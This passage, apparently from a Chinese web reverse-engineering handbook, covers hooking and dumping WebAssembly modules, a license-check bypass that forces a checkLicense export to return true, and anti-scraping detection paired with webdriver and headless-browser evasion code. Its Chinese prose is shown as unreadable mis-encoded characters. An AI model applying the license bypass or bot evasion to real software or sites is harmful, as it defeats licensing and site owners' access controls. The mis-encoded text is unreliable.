        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Frida Hook WebAssembly</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;wasm_function&#39;</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Arguments:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">],</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Return value:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">retval</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜ç¤ºä¾‹">å®æˆ˜ç¤ºä¾‹</h2>

      <h3 id="ç¤ºä¾‹1-åç¼–è¯‘åŠ å¯†å‡½æ•°">ç¤ºä¾‹1: åç¼–è¯‘åŠ å¯†å‡½æ•°</h3>

      <p>å‡è®¾æŸç½‘ç«™ä½¿ç”¨ Wasm å®ç°åŠ å¯†ç®—æ³•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. æ‹¦æˆªå¹¶ä¿å­˜ Wasm æ¨¡å—</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">wasmModule</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalInstantiate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">;</span>
<span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">wasmModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes</span><span class="p">;</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Captured Wasm module, size:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// ä¿å­˜åˆ° IndexedDB ä»¥ä¾¿åç»­åˆ†æ</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Blob</span><span class="p">([</span><span class="nx">bytes</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/wasm&#39;</span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Download URL:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalInstantiate</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// 2. ä½¿ç”¨ wasm2wat è½¬æ¢</span>
<span class="c1">// $ wasm2wat crypto.wasm -o crypto.wat</span>

<span class="c1">// 3. åˆ†æ WAT ä»£ç æ‰¾åˆ°åŠ å¯†é€»è¾‘</span>
<span class="c1">// (func $encrypt (param $0 i32) (param $1 i32) (result i32)</span>
<span class="c1">//   local.get $0</span>
<span class="c1">//   local.get $1</span>
<span class="c1">//   i32.xor</span>
<span class="c1">//   i32.const 0x5A5A5A5A</span>
<span class="c1">//   i32.add</span>
<span class="c1">// )</span>

<span class="c1">// 4. åœ¨ JavaScript ä¸­é‡æ–°å®ç°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">decryptedEncrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x5A5A5A5A</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹2-ä¿®æ”¹-wasm-è¡Œä¸º">ç¤ºä¾‹2: ä¿®æ”¹ Wasm è¡Œä¸º</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä¿®æ”¹ Wasm å‡½æ•°çš„è¿”å›å€¼</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">(</span><span class="nx">module</span><span class="p">);</span>

<span class="c1">// ä¿å­˜åŸå§‹å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalCheckLicense</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">checkLicense</span><span class="p">;</span>

<span class="c1">// æ›¿æ¢å‡½æ•°è®©å…¶æ€»æ˜¯è¿”å› true</span>
<span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">checkLicense</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;License check bypassed&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// è¿”å› true</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹3-å†…å­˜-dump-åˆ†æ">ç¤ºä¾‹3: å†…å­˜ Dump åˆ†æ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Dump Wasm çº¿æ€§å†…å­˜</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">dumpMemory</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">start</span><span class="p">,</span><span class="w"> </span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">memory</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">start</span><span class="p">,</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">length</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="w">        </span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">))</span>
<span class="w">        </span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Memory [</span><span class="si">${</span><span class="nx">start</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">)</span><span class="si">}</span><span class="sb">-</span><span class="si">${</span><span class="p">(</span><span class="nx">start</span><span class="o">+</span><span class="nx">length</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">)</span><span class="si">}</span><span class="sb">]:`</span><span class="p">,</span><span class="w"> </span><span class="nx">hex</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// å°è¯•ä½œä¸ºå­—ç¬¦ä¸²è§£æ</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TextDecoder</span><span class="p">().</span><span class="nx">decode</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;As string:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">dumpMemory</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mf">256</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="é€†å‘åˆ†ææµç¨‹">é€†å‘åˆ†ææµç¨‹</h3>

      <ol>
        <li>
          <p><strong>ä¿¡æ¯æ”¶é›†</strong></p>

          <ul>
            <li>è¯†åˆ« Wasm æ¨¡å—çš„åŠ è½½æ–¹å¼</li>
            <li>ç¡®å®šæ¨¡å—ä¸ JavaScript çš„äº¤äº’æ¥å£</li>
            <li>è®°å½•å¯¼å…¥/å¯¼å‡ºå‡½æ•°</li>
          </ul>
        </li>
        <li>
          <p><strong>é™æ€åˆ†æä¼˜å…ˆ</strong></p>

          <ul>
            <li>ä½¿ç”¨ wasm2wat è·å–å¯è¯»æ ¼å¼</li>
            <li>ä½¿ç”¨ wasm-decompile è·å¾—ä¼ªä»£ç </li>
            <li>åœ¨ IDA Pro/Ghidra ä¸­æ·±å…¥åˆ†æ</li>
          </ul>
        </li>
        <li>
          <p><strong>åŠ¨æ€éªŒè¯</strong></p>

          <ul>
            <li>ä½¿ç”¨ Chrome DevTools è°ƒè¯•</li>
            <li>Hook å…³é”®å‡½æ•°éªŒè¯å‡è®¾</li>
            <li>ç›‘æ§å†…å­˜å˜åŒ–</li>
          </ul>
        </li>
        <li>
          <p><strong>æ–‡æ¡£åŒ–å‘ç°</strong></p>

          <ul>
            <li>è®°å½•å‡½æ•°ç­¾åå’Œç”¨é€”</li>
            <li>ç»˜åˆ¶è°ƒç”¨å…³ç³»å›¾</li>
            <li>æ ‡æ³¨å…³é”®ç®—æ³•</li>
          </ul>
        </li>
      </ol>

      <h3 id="å¸¸ç”¨æŠ€å·§">å¸¸ç”¨æŠ€å·§</h3>

      <ol>
        <li>
          <p><strong>è¯†åˆ«å­—ç¬¦ä¸²</strong>: Wasm æ²¡æœ‰å­—ç¬¦ä¸²ç±»å‹ï¼Œé€šå¸¸å­˜å‚¨åœ¨çº¿æ€§å†…å­˜ä¸­</p>

          <div class="codehilite">
            <pre><span></span><code>strings<span class="w"> </span>module.wasm<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;password&quot;</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>å¯»æ‰¾å¯†é’¥</strong>: åœ¨ Data Section ä¸­æŸ¥æ‰¾å¯ç–‘å¸¸é‡</p>

          <div class="codehilite">
            <pre><span></span><code>wasm-objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>data<span class="w"> </span>module.wasm
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>è¿½è¸ªç®—æ³•</strong>: è¯†åˆ«å¸¸è§åŠ å¯†ç®—æ³•çš„ç‰¹å¾æ¨¡å¼</p>

          <ul>
            <li>AES: S-box æŸ¥æ‰¾è¡¨</li>
            <li>RSA: å¤§æ•´æ•°è¿ç®—</li>
            <li>SHA: å›ºå®šçš„åˆå§‹åŒ–å‘é‡</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-å¦‚ä½•ä»ç½‘é¡µä¸­æå–-wasm-æ¨¡å—">Q: å¦‚ä½•ä»ç½‘é¡µä¸­æå– Wasm æ¨¡å—ï¼Ÿ</h3>

      <p><strong>A</strong>: æœ‰å¤šç§æ–¹æ³•ï¼š</p>

      <ol>
        <li><strong>Network é¢æ¿</strong>: åœ¨ Chrome DevTools çš„ Network æ ‡ç­¾ä¸­è¿‡æ»¤ <code>.wasm</code> æ–‡ä»¶</li>
        <li><strong>è¦†ç›– WebAssembly API</strong>: æ‹¦æˆª <code>fetch</code> æˆ– <code>WebAssembly.instantiate</code></li>
        <li><strong>æµè§ˆå™¨æ‰©å±•</strong>: ä½¿ç”¨ Wasm Dumper ç­‰æ‰©å±•</li>
        <li><strong>ä»£ç†å·¥å…·</strong>: ä½¿ç”¨ Burp Suite æˆ– mitmproxy æ‹¦æˆª</li>
      </ol>

      <h3 id="q-wasm-èƒ½å¦è¢«æ··æ·†">Q: Wasm èƒ½å¦è¢«æ··æ·†ï¼Ÿ</h3>

      <p><strong>A</strong>: å¯ä»¥ï¼Œä½†æ•ˆæœæœ‰é™ï¼š</p>

      <ul>
        <li>å˜é‡ååœ¨ç¼–è¯‘åä¼šä¸¢å¤±</li>
        <li>å‡½æ•°å¯ä»¥è¢«é‡å‘½å</li>
        <li>æ§åˆ¶æµå¯ä»¥è¢«æ··æ·†ï¼ˆæ’å…¥æ­»ä»£ç ã€æ‹†åˆ†åŸºæœ¬å—ï¼‰</li>
        <li>å¸¸é‡å¯ä»¥è¢«åŠ å¯†</li>
        <li>ä½†æŒ‡ä»¤é›†æœ‰é™ï¼Œæ¨¡å¼è¯†åˆ«ç›¸å¯¹å®¹æ˜“</li>
      </ul>

      <h3 id="q-å¦‚ä½•å¤„ç†åŠ å¯†çš„-wasm-æ¨¡å—">Q: å¦‚ä½•å¤„ç†åŠ å¯†çš„ Wasm æ¨¡å—ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>åœ¨ <code>WebAssembly.compile</code> æˆ– <code>instantiate</code> å¤„ä¸‹æ–­ç‚¹</li>
        <li>æ­¤æ—¶æ¨¡å—å·²è§£å¯†ï¼Œä»å†…å­˜ä¸­æå–</li>
        <li>æˆ–è€… Hook è§£å¯†å‡½æ•°ï¼Œè®°å½•è§£å¯†åçš„å­—èŠ‚</li>
      </ol>

      <h3 id="q-wasm-é€†å‘æ¯”-javascript-é€†å‘æ›´éš¾å—">Q: Wasm é€†å‘æ¯” JavaScript é€†å‘æ›´éš¾å—ï¼Ÿ</h3>

      <p><strong>A</strong>: å„æœ‰ç‰¹ç‚¹ï¼š</p>

      <ul>
        <li><strong>Wasm ä¼˜åŠ¿</strong>: æŒ‡ä»¤é›†ç®€å•ã€ç±»å‹æ˜ç¡®ã€æ— åŠ¨æ€ç‰¹æ€§</li>
        <li><strong>Wasm åŠ£åŠ¿</strong>: ç¼ºå°‘ç¬¦å·ä¿¡æ¯ã€ç¼–è¯‘ä¼˜åŒ–å¯¼è‡´ä»£ç å¤æ‚</li>
        <li><strong>æ€»ä½“</strong>: å°å‹ Wasm æ¨¡å—é€šå¸¸æ›´å®¹æ˜“åˆ†æï¼Œå¤§å‹æ¨¡å—éœ€è¦ä¸“ä¸šå·¥å…·</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å®˜æ–¹èµ„æº">å®˜æ–¹èµ„æº</h3>

      <ul>
        <li><a href="https://webassembly.github.io/spec/">WebAssembly å®˜æ–¹è§„èŒƒ</a></li>
        <li><a href="https://developer.mozilla.org/en-US/docs/WebAssembly">MDN WebAssembly æ–‡æ¡£</a></li>
        <li><a href="https://webassembly.github.io/spec/core/exec/instructions.html">WebAssembly æŒ‡ä»¤é›†å‚è€ƒ</a></li>
      </ul>

      <h3 id="å·¥å…·ä¸é¡¹ç›®">å·¥å…·ä¸é¡¹ç›®</h3>

      <ul>
        <li><a href="https://github.com/WebAssembly/wabt">WABT (WebAssembly Binary Toolkit)</a> - å®˜æ–¹å·¥å…·é›†</li>
        <li><a href="https://github.com/WebAssembly/binaryen">Binaryen</a> - ä¼˜åŒ–å’Œç¼–è¯‘å·¥å…·</li>
        <li><a href="https://wasmtime.dev/">wasmtime</a> - ç‹¬ç«‹ Wasm è¿è¡Œæ—¶</li>
        <li><a href="https://wasmer.io/">wasmer</a> - å¦ä¸€ä¸ª Wasm è¿è¡Œæ—¶</li>
      </ul>

      <h3 id="å®‰å…¨ç ”ç©¶">å®‰å…¨ç ”ç©¶</h3>

      <ul>
        <li><a href="https://www.ndss-symposium.org/wp-content/uploads/2020/02/23071-paper.pdf">WebAssembly Security:
            Potentials and Pitfalls</a></li>
        <li><a href="https://www.usenix.org/system/files/sec20-lehmann.pdf">Everything Old is New Again: Binary Security
            of WebAssembly</a></li>
        <li><a href="https://webassembly-security.com/">Analyzing WebAssembly Binaries</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
        <li><a href="#04-Advanced-Recipes-frontend-hardening">å‰ç«¯åŠ å›ºæŠ€æœ¯</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="../02-Techniques/browser_debugging.md">æµè§ˆå™¨è°ƒè¯•æŠ€å·§</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-anti-scraping-deep-dive">
      <h2>37. Anti-Scraping Deep Dive</h2>
      <h1 id="åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>ç°ä»£ç½‘ç«™é‡‡ç”¨å¤šå±‚æ¬¡ã€å¤šç»´åº¦çš„åçˆ¬è™«ä½“ç³»ã€‚æœ¬ç« æ·±å…¥åˆ†æä¸»æµåçˆ¬è™«æŠ€æœ¯çš„åŸç†ã€æ£€æµ‹æ–¹æ³•åŠå¯¹æŠ—ç­–ç•¥ã€‚</p>

      <hr />

      <h2 id="åçˆ¬è™«æŠ€æœ¯åˆ†ç±»">åçˆ¬è™«æŠ€æœ¯åˆ†ç±»</h2>

      <h3 id="1-åŸºäºè¡Œä¸ºçš„æ£€æµ‹">1. åŸºäºè¡Œä¸ºçš„æ£€æµ‹</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>è¯·æ±‚é¢‘ç‡å¼‚å¸¸ï¼ˆçŸ­æ—¶é—´å¤§é‡è¯·æ±‚ï¼‰</li>
        <li>è®¿é—®æ¨¡å¼å¼‚å¸¸ï¼ˆåªè®¿é—® APIï¼Œä¸è®¿é—®é™æ€èµ„æºï¼‰</li>
        <li>ç”¨æˆ·è¡Œä¸ºç¼ºå¤±ï¼ˆæ— é¼ æ ‡ç§»åŠ¨ã€é”®ç›˜äº‹ä»¶ï¼‰</li>
      </ul>

      <p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æœåŠ¡ç«¯æ£€æµ‹é€»è¾‘ç¤ºä¾‹</span>
<span class="k">def</span><span class="w"> </span><span class="nf">is_bot_behavior</span><span class="p">(</span><span class="n">request_log</span><span class="p">):</span>
    <span class="c1"># 1. æ£€æŸ¥è¯·æ±‚é¢‘ç‡</span>
    <span class="k">if</span> <span class="n">request_log</span><span class="o">.</span><span class="n">count_in_last_minute</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="c1"># 2. æ£€æŸ¥ User-Agent</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">request_log</span><span class="o">.</span><span class="n">has_valid_user_agent</span><span class="p">():</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="c1"># 3. æ£€æŸ¥ Referer é“¾</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">request_log</span><span class="o">.</span><span class="n">has_valid_referer_chain</span><span class="p">():</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="k">return</span> <span class="kc">False</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <ul>
        <li>æ·»åŠ éšæœºå»¶è¿Ÿï¼š<code>time.sleep(random.uniform(1, 3))</code></li>
        <li>æ¨¡æ‹Ÿå®Œæ•´çš„æµè§ˆè¡Œä¸ºï¼šè®¿é—®é¦–é¡µ -> åˆ—è¡¨é¡µ -> è¯¦æƒ…é¡µ</li>
        <li>åŠ è½½é™æ€èµ„æºï¼ˆCSS/JS/å›¾ç‰‡ï¼‰</li>
      </ul>

      <hr />

      <h3 id="2-åŸºäº-javascript-çš„æ£€æµ‹">2. åŸºäº JavaScript çš„æ£€æµ‹</h3>

      <h4 id="æ£€æµ‹-webdriver">æ£€æµ‹ webdriver</h4>

      <p><strong>æ£€æµ‹ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">webdriver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Bot detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹ Selenium ç‰¹å¾</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s1">&#39;webdriver&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Selenium detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹ PhantomJS</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">callPhantom</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_phantom</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;PhantomJS detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Puppeteer</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">navigator</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;webdriver&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="kc">undefined</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="ow">delete</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">webdriver</span><span class="p">;</span>
<span class="p">});</span>

<span class="c1">// Selenium</span>
<span class="nx">options</span><span class="p">.</span><span class="nx">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">)</span>
<span class="nx">driver</span><span class="p">.</span><span class="nx">execute_cdp_cmd</span><span class="p">(</span><span class="s1">&#39;Page.addScriptToEvaluateOnNewDocument&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s1">&#39;source&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">        Object.defineProperty(navigator, &#39;</span><span class="nx">webdriver</span><span class="s1">&#39;, {</span>
<span class="s1">            get: () =&gt; undefined</span>
<span class="s1">        })</span>
<span class="s1">    &#39;&#39;&#39;</span>
<span class="p">})</span>
</code></pre>
      </div>

      <h4 id="æ£€æµ‹-chrome-headless">æ£€æµ‹ Chrome Headless</h4>

      <p><strong>æ£€æµ‹ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ User-Agent</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sr">/HeadlessChrome/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Headless detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹æ’ä»¶æ•°é‡</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">plugins</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Headless detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ£€æµ‹ Chrome å¯¹è±¡</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">chrome</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Not real Chrome!&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä¼ªé€  User-Agent</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">setUserAgent</span><span class="p">(</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&#39;</span><span class="p">);</span>

<span class="c1">// ä¼ªé€  Chrome å¯¹è±¡</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
